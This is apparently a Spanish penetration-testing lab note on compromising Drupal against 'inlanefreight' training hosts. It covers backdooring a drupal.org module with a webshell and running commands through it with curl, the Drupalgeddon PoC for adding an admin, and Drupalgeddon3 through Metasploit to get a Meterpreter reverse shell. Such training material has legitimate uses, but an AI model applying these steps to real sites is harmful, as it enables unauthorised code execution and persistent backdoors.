## Subiendo modulo con backdoor

Decargamos un modulo que se encuentran en `drupal.org` (por ejemplo  [CAPTCHA](https://www.drupal.org/project/captcha)\

Bajamos hasta los realesas y le damos a uno

![[Pasted image 20260726202538.png]]

Decargamos el tar.gz

![[Pasted image 20260726202636.png]]

Descomprimimos:

```
tar xvf captcha-8.x-1.2.tar.gz
```

Creamos un archivo shell.php con el siguiente contenido:

![[Pasted image 20260726202716.png]]


Creamos un archivo .htaccess para darnos acceso a la carpeta /modules

```
<IfModule mod_rewrite.c> RewriteEngine On RewriteBase / </IfModule>
```
![[Pasted image 20260726202814.png]]

Movemos ambos archivos a captcha y volvemos a comprimirlo:

```
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
![[Pasted image 20260726202854.png]]

Asumiendo que tenemos privs administrativos:

	Manage > Extend (barra lateral) > + > Install new Module > Navegamos hasta el tar.gz > Install

![[Pasted image 20260726203019.png]]

Una vez instalado vamos a `/modules/captcha/shell.php`:

```
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

## Aprovechando vulnerabilidades conocidas

Drupal ha tenido varias vuln de RCE apodadas DrupalgeddonX


## Drupalgeddon

Puede ser explotado aprovechando una inyección SQL preautenticada que puede ser utilizada para subir código malicioso o añadir un usuario administrador. Intentemos añadir un nuevo usuario administrador con este script de PoC

[PoC](https://www.exploit-db.com/exploits/34992)

Una vez que se añade un usuario administrador, podríamos iniciar sesión y habilitar el módulo `PHP Filter` para lograr la ejecución remota de código

```
python2.7 druppalgeddon.py
```
![[Pasted image 20260726203319.png]]![[Pasted image 20260726203333.png]]


```
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u USER -p PASS
```
![[Pasted image 20260726203358.png]]

Iniciamos sesion con nuestro nuevo usuario y obtenemos shell como discutimos anteriormente:

![[Pasted image 20260726203424.png]]

O usamos el modulo de MSF: [exploit/multi/http/drupal_drupageddon](https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/

## Drupalgeddon3

[Drupalgeddon3](https://github.com/rithchard/Drupalgeddon3) es una vulnerabilidad de ejecución remota de código autenticada que afecta a [múltiples versiones](https://www.drupal.org/sa-core-2018-004)

Requiere que un usuario tenga la capacidad de eliminar un nodo

Podemos explotar esto usando MSF, pero primero debemos:
- Iniciar sesión 
- Obtener una cookie de sesión (session cookie) válida

1. Iniciamos sesion y obtenemos la cookie en burp:

![[Pasted image 20260726204104.png]]


2. Usamos el modulo de MSF `multi/http/drupal_drupalgeddon3` y obtenemos un Meterpreter:

```
wget https://www.exploit-db.com/download/44557 -O 44557.rb
cp 44557.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/drupal_drupageddon3.rb
msfconsole -q
reload_all
```

```
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
set DRUPAL_NODE 1
set LHOST 10.10.14.15
exploit
```
